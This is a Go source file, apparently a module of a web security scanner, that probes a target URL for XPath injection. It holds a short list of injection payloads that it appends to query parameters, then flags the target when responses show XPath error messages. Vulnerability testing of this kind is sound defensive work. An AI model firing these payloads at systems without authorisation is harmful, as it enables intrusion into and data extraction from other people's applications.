package modules

import (
	"context"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"
)

// XpathInjectionTestingResult holds the result of the XpathInjectionTesting module execution.
type XpathInjectionTestingResult struct {
	Target string `json:"target"`
	Status string `json:"status"`
	Detail string `json:"detail,omitempty"`
}

// XpathInjectionTesting executes the xpath_injection_testing security technique.
type XpathInjectionTesting struct {
	Target     string
	maxThreads int
	mu         sync.Mutex
	results    []XpathInjectionTestingResult
	client     *http.Client
}

// NewXpathInjectionTesting creates a new instance.
func NewXpathInjectionTesting(target string) *XpathInjectionTesting {
	return &XpathInjectionTesting{
		Target:     EnsureHTTPPrefix(target),
		maxThreads: 5,
		client:     NewHTTPClient(10 * time.Second),
	}
}

func (m *XpathInjectionTesting) SetThreads(count int) {
	if count < 1 {
		count = 1
	}
	m.maxThreads = count
}

var xpathPayloads = []string{
	"' or '1'='1",
	"\" or \"1\"=\"1",
	"'] | //user/* [ '1'='1",
}

func (m *XpathInjectionTesting) Execute(ctx context.Context) ([]XpathInjectionTestingResult, error) {
	m.results = make([]XpathInjectionTestingResult, 0)

	parsedURL, err := url.Parse(m.Target)
	if err != nil {
		return m.results, err
	}

	jobs := make(chan string, len(xpathPayloads))
	for _, p := range xpathPayloads {
		jobs <- p
	}
	close(jobs)

	var wg sync.WaitGroup

	for i := 0; i < m.maxThreads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for payload := range jobs {
				select {
				case <-ctx.Done():
					return
				default:
					m.testPayload(ctx, parsedURL, payload)
				}
			}
		}()
	}

	done := make(chan struct{})
	go func() {
		wg.Wait()
		close(done)
	}()

	select {
	case <-done:
		return m.results, nil
	case <-ctx.Done():
		<-done
		return m.results, ctx.Err()
	}
}

func (m *XpathInjectionTesting) testPayload(ctx context.Context, u *url.URL, payload string) {
	query := u.Query()
	hasParams := len(query) > 0

	testURL := *u
	if hasParams {
		for key, vals := range query {
			for i, val := range vals {
				query[key][i] = val + payload
			}
		}
		testURL.RawQuery = query.Encode()
	} else {
		query.Add("q", payload)
		query.Add("search", payload)
		testURL.RawQuery = query.Encode()
	}

	req, err := http.NewRequestWithContext(ctx, "GET", testURL.String(), nil)
	if err != nil {
		return
	}

	resp, err := m.client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return
	}

	bodyStr := strings.ToLower(string(bodyBytes))

	// Common XPath error signatures
	if strings.Contains(bodyStr, "xpath") && (strings.Contains(bodyStr, "syntax error") || strings.Contains(bodyStr, "invalid expression")) {
		m.mu.Lock()
		m.results = append(m.results, XpathInjectionTestingResult{
			Target: m.Target,
			Status: "vulnerable",
			Detail: "XPath Injection detected via error signature with payload: " + payload,
		})
		m.mu.Unlock()
	}
}
